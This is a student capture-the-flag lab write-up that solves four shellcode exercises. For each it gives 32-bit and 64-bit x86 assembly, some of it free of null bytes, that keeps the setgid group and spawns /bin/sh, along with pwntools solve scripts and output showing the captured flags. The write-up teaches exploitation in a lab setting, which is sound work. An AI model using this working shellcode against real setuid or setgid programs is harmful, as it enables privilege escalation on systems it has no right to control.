# Write-up for Unit2-1

- netID: TXK220008
- Name: Takemaru Kadoi

All the write-ups are supposed to use this import.

```python
from pwn import asm, process, context
```

## 1-shellcode-32

The problem statement is below.

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The solution seems straightforward. Write assembly to execute the command above.

[This site](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit) looks good to refer to system calls.

This is the assembly code to execute the required shellcode.

```python
# setregid(getegid(), getegid())
# getegid: 0x32(%eax)
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
shellcode = asm(
    """
mov     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
mov     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
mov     ecx, 0
mov     edx, 0
int     0x80
"""
)
```

This is the code to run the assembly.

```python
io = process(['./1-shellcode-32'])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/1-shellcode-32$ ./solve.py
[+] Starting local process './1-shellcode-32': pid 17060
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{execve_bin_sh}
```

## 2-shellcode-64

The problem statement is below.

```md
Write a 64-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.
```

The only difference from `1-shellcode-32` is that this problem uses 64-bit program. Bear it in mind and solve it.

To make the assembly for 64-bit program, use `context.clear(arch="amd64")`.

The program is basically the same, but to use 8 bytes for a string, I am using stack here.

```x86asm
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
```

```python
context.clear(arch="amd64")

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
mov     rax, 0x6c
syscall
mov     rdi, rax
mov     rsi, rax
mov     rax, 0x72
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
mov     rax, 0x3b
mov     rbx, 0x68732f6e69622f2f
push    0
push    rbx
mov     rdi, rsp
mov     rsi, 0
mov     rdx, 0
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./2-shellcode-64"])
io.interactive()
```

After running the program, you get the following flag.

```bash
TXK220008@ctf-vm1:~/unit2/2-shellcode-64$ ./solve2.py
[+] Starting local process './2-shellcode-64': pid 9898
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{exEcvE_b1n_5h
```

## 3-nonzero-shellcode-32

The problem statement is below

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

The problem here is how to write `mov <register> <immediate_value>`

For example, the `mov eax, 0x32` contains `0x00`, i.e., a zero byte.

```bash
>>> asm("mov eax, 0x32")
b'\xb82\x00\x00\x00'
```

We can do it using `xor` and `add`. In the above case, we can write like this.

```bash
>>> asm("xor eax, eax")
b'1\xc0'
>>> asm("add eax, 0x32")
b'\x83\xc02
```

Thus, the overview of the code is like this.

```python
# setregid(getegid(), getegid())
# setregid: 0x47(%eax) (%ebx = gid_t rgid, %ecx = gid_t rgid)
# getegid: 0x32(%eax)
shellcode = asm(
    """
xor     eax, eax
add     eax, 0x32
int     0x80
mov     ebx, eax
mov     ecx, eax
xor     eax, eax
add     eax, 0x47
int     0x80
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x0b(%eax) (%ebx = const char *filename, %ecx = const char *const *argv, %edx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     eax, eax
add     eax, 0x0b
push    edx
push    0x68732f6e
push    0x69622f2f
mov     ebx, esp
xor     ecx, ecx
xor     edx, edx
int     0x80
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./3-nonzero-shellcode-32"])
io.interactive()
```

You get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/3-nonzero-shellcode-32$ ./solve3.py 
b'1\xc0\x83\xc02\xcd\x80\x89\xc3\x89\xc11\xc0\x83\xc0G\xcd\x801\xc0\x83\xc0\x0bRhn/shh//bi\x89\xe31\xc91\xd2\xcd\x80'
[+] Starting local process './3-nonzero-shellcode-32': pid 12180
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{push_aNd_X0R}
```

## 4-nonzero-shellcode-64

The problem statement is below.(fixed typo)

```md
Write a 32-bit shellcode that runs:
    setregid(getegid(), getegid())
    execve("/bin/sh", 0, 0);
and put the shellcode binary (shellcode.bin) into this directory.

Your shellcode must not have zero byte.
Check that with make objdump and make print. No 00 or \x00!
```

Basically, the same as 32-bit version.

```python
#!/usr/bin/env python3
from pwn import *
from pwn import asm, context, gdb, process

context.clear(arch="amd64")
context.terminal = ["tmux", "splitw", "-h"]

# setregid(getegid(), getegid())
# getegid: 0x6c(%rax)
# setregid: 0x72(%rax) (%rdi = gid_t rgid, %rsi = gid_t rgid)
shellcode = asm(
    """
xor     rax, rax
add     rax, 108
syscall
mov     rdi, rax
mov     rsi, rax
xor     rax, rax
add     rax, 114
syscall
"""
)
# execve("/bin/sh", 0, 0)
# execve: 0x3b(%rax) (%rdi = const char *filename, %rsi = const char *const *argv, %rdx = const char *const *envp)
# /bin/sh = 2f62696e2f7368
shellcode += asm(
    """
xor     rax, rax
add     rax, 0x3b
xor     rdx, rdx
push    rdx
mov     rbx, 0x68732f6e69622f2f
push    rbx
mov     rdi, rsp
xor     rsi, rsi
xor     rdx, rdx
syscall
"""
)
with open("shellcode.bin", "wb") as shellcode_file:
    shellcode_file.write(shellcode)
io = process(["./4-nonzero-shellcode-64"])
# p = gdb.attach(
#     io,
#     """
# break *0x400aeb
# run
# """,
# )
io.interactive()
```

Executing this, you get the flag.

```bash
TXK220008@ctf-vm1:~/unit2/4-nonzero-shellcode-64$ ./solve4.py
[+] Starting local process './4-nonzero-shellcode-64': pid 11626
[*] Switching to interactive mode
Reading shellcode from shellcode.bin
$ cat flag
CS6332{n0_puSh_bUt_CLTD}
```